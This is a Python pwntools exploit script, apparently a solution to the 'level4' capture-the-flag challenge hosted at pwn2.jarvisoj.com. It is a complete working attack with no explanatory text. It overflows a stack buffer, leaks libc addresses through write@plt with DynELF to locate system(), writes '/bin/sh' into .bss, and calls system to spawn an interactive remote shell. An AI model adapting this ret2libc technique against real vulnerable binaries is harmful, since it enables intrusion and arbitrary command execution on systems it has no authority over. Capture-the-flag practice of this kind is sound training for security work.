#!/usr/bin/env python
from pwn import *

#sh = process("./level4")
sh = remote("pwn2.jarvisoj.com", 9880)
level4 = ELF("./level4")
write_plt = level4.plt["write"]
main_address = level4.symbols["main"]

def leak(address):
	payload = 'a' * 0x88 + 'bbbb' + p32(write_plt) + p32(main_address) + p32(1) + p32(address) +p32(4)
	sh.sendline(payload)
	leak_address = sh.recv(4)
	return leak_address

libcbase = DynELF(leak, elf=ELF('./level4'))
sys_address = libcbase.lookup('system', 'libc')

bss_address = level4.bss()
read_plt = level4.plt['read']
#pause()
payload = 'a' * 0x88 + 'bbbb' + p32(read_plt) +p32(main_address) + p32(0) + p32(bss_address) + p32(8)

sh.send(payload)

sh.send("/bin/sh\0")
print "the sys address : %x" % sys_address
print "the bss address : %x" % bss_address
payload = 'a' * 0x88 + 'bbbb' + p32(sys_address) + p32(0xdeadbeef) + p32(bss_address)

sh.sendline(payload)
sh.interactive()
